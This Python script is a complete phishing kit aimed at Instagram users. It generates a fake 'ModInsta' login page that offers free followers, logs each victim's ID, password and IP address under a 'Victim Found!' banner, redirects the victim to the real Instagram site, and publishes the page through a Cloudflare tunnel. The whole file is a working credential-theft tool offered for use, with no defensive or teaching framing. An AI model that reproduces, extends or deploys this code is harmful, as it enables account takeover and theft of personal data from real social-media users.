import os
import socket
import subprocess
from http.server import HTTPServer, SimpleHTTPRequestHandler
from threading import Thread
import time
import pyfiglet
from termcolor import colored

# Check for key
key = input(colored("[!] Enter the access key to run the server: ", "yellow"))
if key != "bode":
    print(colored("[-] Incorrect key. Access denied.", "red"))
    exit()

# Save HTML file
html_code = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>ModInsta Login</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: linear-gradient(45deg, #1c1c1c, #3c3c3c);
            font-family: 'Arial', sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            color: white;
        }
        h1 {
            font-size: 3rem;
            margin-bottom: 10px;
            color: #FF007F;
            text-shadow: 2px 2px #000;
        }
        p {
            color: #ccc;
            margin-bottom: 30px;
        }
        .login-box {
            background: #222;
            padding: 20px 30px;
            border-radius: 15px;
            box-shadow: 0 0 20px #000;
            animation: popin 0.6s ease-out;
        }
        .login-box input {
            display: block;
            width: 100%;
            padding: 10px;
            margin: 15px 0;
            border: none;
            border-radius: 5px;
        }
        .login-box button {
            width: 100%;
            padding: 10px;
            border: none;
            background: #FF007F;
            color: white;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
        }
        @keyframes popin {
            from { transform: scale(0.8); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }
    </style>
</head>
<body>
    <h1>ModInsta</h1>
    <p>Get 1K Followers Instantly! Secure & Easy</p>
    <div class="login-box">
        <form method="POST">
            <input type="text" name="id" placeholder="Instagram ID" required>
            <input type="password" name="pass" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
"""

with open("index.html", "w") as file:
    file.write(html_code)

# Custom HTTP handler to log credentials
class Handler(SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode()
        data = dict(x.split('=') for x in post_data.split('&'))
        ip = self.client_address[0]

        print(colored(f"\nVictim Found!", "cyan"))
        print(colored("================", "green"))
        print(colored(f"ID   : {data.get('id', '')}", "yellow"))
        print(colored(f"Pass : {data.get('pass', '')}", "yellow"))
        print(colored(f"IP   : {ip}", "yellow"))
        print(colored("================\n", "green"))

        self.send_response(301)
        self.send_header('Location', 'https://www.instagram.com/')
        self.end_headers()

# Start HTTP server in background
def start_server():
    server_address = ('', 8080)
    httpd = HTTPServer(server_address, Handler)
    httpd.serve_forever()

Thread(target=start_server, daemon=True).start()

# Create cloudflared tunnel in background
def tunnel():
    os.system("cloudflared tunnel --url http://localhost:8080 > tunnel.log 2>&1")

Thread(target=tunnel, daemon=True).start()

# Wait for public URL
print(colored("[*] Starting Cloudflare Tunnel...", "cyan"))
while True:
    time.sleep(2)
    if os.path.exists("tunnel.log"):
        with open("tunnel.log", "r") as log:
            for line in log:
                if "trycloudflare.com" in line:
                    public_url = line.split("Visit it at")[1].strip()
                    break
            else:
                continue
        break

# Ping test
try:
    ping_result = subprocess.getoutput("ping -c 1 8.8.8.8")
    ping_time = ping_result.split("time=")[-1].split(" ms")[0] + " ms"
except:
    ping_time = "Unknown"

ip = socket.gethostbyname(socket.gethostname())

# Display info
print()
print(colored("Network   [ ONLINE ]", "green"))
print(colored(f"Ping      [ {ping_time} ]", "yellow"))
print(colored(f"IP        [ {ip} ]", "yellow"))
print(colored(f"Port      [ 8080 ]", "yellow"))
print(colored("\n=X=X=X=X=X=X=X=X=X=X=X=X=", "magenta"))
print(colored("Creator : Payload Master", "blue"))
print(colored("=X=X=X=X=X=X=X=X=X=X=X=X=\n", "magenta"))
print(colored(f"Server hosting at: {public_url}", "cyan", attrs=["bold"]))
